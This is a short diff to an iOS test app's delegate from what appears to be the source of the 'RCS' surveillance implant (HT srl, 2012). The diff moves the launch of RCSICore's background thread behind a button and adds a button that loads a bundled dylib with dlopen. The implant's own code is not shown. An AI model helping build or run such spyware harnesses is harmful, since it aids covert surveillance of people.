@@ -5,7 +5,7 @@
 //  Created by kiodo on 24/03/12.
 //  Copyright 2012 HT srl. All rights reserved.
 //
-
+#import <dlfcn.h>
 #import "ios_test_appAppDelegate.h"
 
 #define LOG_KEY_FILE  @"logAesKey.txt"
@@ -55,20 +55,6 @@ void asciiToHex(char *string, char *binary)
 
 - (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
 {
-  //configurationFileName: "b2YC6yY6CFcc";
-  
-  int shMemSize = SHMEM_COMMAND_MAX_SIZE;
-  
-  [self setGlobalVars];
-  
-  RCSICore *core = [[RCSICore alloc] initWithShMemorySize: shMemSize];
-                                  
-  [NSThread detachNewThreadSelector:@selector(runMeh) toTarget:core withObject:nil];
-  
-  [gDylibName retain];
-  [gConfigurationName retain];
-  [gConfigurationUpdateName retain];
-                                                                
   [self.window makeKeyAndVisible];
   return YES;
 }
@@ -116,6 +102,34 @@ void asciiToHex(char *string, char *binary)
 {
   [_window release];
     [super dealloc];
+}
+
+- (IBAction)runRCS:(id)sender
+{
+  //configurationFileName: "b2YC6yY6CFcc";
+  
+  [self setGlobalVars];
+  
+  RCSICore *core = [[RCSICore alloc] init];
+  
+  [NSThread detachNewThreadSelector:@selector(runMeh) toTarget:core withObject:nil];
+  
+  [gDylibName retain];
+  [gConfigurationName retain];
+  [gConfigurationUpdateName retain];
+  [gCurrInstanceIDFileName retain];
+}
+
+- (IBAction)runDylib:(id)sender
+{
+  char dylibPath[256];
+  void *handle = NULL;
+  
+  NSString *localPath = [[NSBundle mainBundle] bundlePath];
+  
+  snprintf(dylibPath, sizeof(dylibPath), "%s/dylib.ios/dylib", [localPath cStringUsingEncoding: NSUTF8StringEncoding]);
+  
+  handle = dlopen(dylibPath, RTLD_NOW);
 }
 
 @end
